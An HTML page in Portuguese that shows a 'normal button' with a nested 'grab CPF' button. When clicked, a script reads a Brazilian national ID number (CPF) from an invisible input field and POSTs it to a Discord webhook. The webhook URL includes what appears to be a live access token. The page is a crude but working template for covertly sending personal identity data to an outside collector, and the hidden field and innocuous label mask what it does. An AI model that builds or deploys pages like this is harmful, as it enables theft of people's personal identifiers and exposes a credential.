<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Botão com Botão Interno</title>
    <style>
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        .outer-button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 16px;
            cursor: pointer;
            position: relative;
        }
        .inner-button {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 14px;
            cursor: pointer;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .hidden-input {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="outer-button" onclick="sendCPFToWebhook()">
            Botão Normal
            <button class="inner-button">Pegar CPF</button>
        </button>
    </div>

    <!-- Input oculto para o CPF -->
    <input type="text" id="cpfInput" class="hidden-input" value="123.456.789-00">

    <script>
        function sendCPFToWebhook() {
            // Obtém o valor do input oculto
            const cpfInput = document.getElementById('cpfInput');
            const cpf = cpfInput.value;

            // URL do webhook para onde você quer enviar o CPF
            const webhookUrl = "https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk";

            // Dados a serem enviados
            const data = {
                cpf: cpf
            };

            // Enviando a requisição POST para o webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Sucesso:', data);
            })
            .catch((error) => {
                console.error('Erro:', error);
            });
        }
    </script>
</body>
</html>
